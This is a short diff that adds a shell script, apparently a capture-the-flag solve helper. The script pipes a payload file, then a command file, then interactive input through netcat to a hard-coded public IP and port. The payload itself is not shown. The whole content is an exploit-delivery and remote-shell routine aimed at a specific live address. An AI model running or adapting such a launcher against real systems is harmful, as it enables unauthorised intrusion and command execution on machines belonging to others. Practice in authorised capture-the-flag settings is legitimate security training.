@@ -1,0 +1,2 @@
+#!/bin/sh
+(cat sol; sleep 1; cat cmd -) | nc 175.119.158.132 22222
